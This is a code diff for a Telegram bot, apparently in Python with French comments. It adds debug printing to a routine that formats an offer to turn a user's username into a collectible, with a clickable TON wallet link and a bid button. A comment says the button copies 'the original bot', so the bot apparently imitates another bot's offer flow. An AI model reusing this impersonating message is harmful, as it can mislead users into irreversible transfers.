@@ -80,6 +80,10 @@ Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
     
+    print(f"📝 MESSAGE COMPLET:")
+    print(f"'{fragment_message}'")
+    print(f"📏 Longueur totale: {len(fragment_message)}")
+    
     # Création des entités pour le formatage
     entities = []
     
@@ -123,19 +127,27 @@ Important:
             length=len(important_text2)
         ))
     
-    # 5. Wallet cliquable - CORRECTION DE LA LONGUEUR
+    # 5. Wallet cliquable - DEBUG COMPLET
     wallet_start = fragment_message.find(wallet_address)
     if wallet_start != -1:
-        # Vérification de la longueur exacte de l'adresse
-        actual_length = len(wallet_address)  # Devrait être 48
+        # Debug complet
+        actual_length = len(wallet_address)
+        wallet_end = wallet_start + actual_length
+        
+        print(f"🔍 DEBUG WALLET:")
+        print(f"   Adresse: '{wallet_address}'")
+        print(f"   Longueur: {actual_length}")
+        print(f"   Position début: {wallet_start}")
+        print(f"   Position fin: {wallet_end}")
+        print(f"   Texte autour: '{fragment_message[wallet_start-5:wallet_end+5]}'")
+        print(f"   Derniers caractères: '{wallet_address[-4:]}'")
+        
         entities.append(MessageEntity(
             type=MessageEntity.TEXT_LINK,
             offset=wallet_start,
-            length=actual_length,  # Utilise la longueur réelle
+            length=actual_length,
             url=f"https://tonviewer.com/{wallet_address}"
         ))
-        print(f"🔗 Wallet link: position {wallet_start}, longueur {actual_length} caractères")
-        print(f"📝 Adresse: '{wallet_address}'")
     
     # URL du bouton - identique au bot original
     button_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
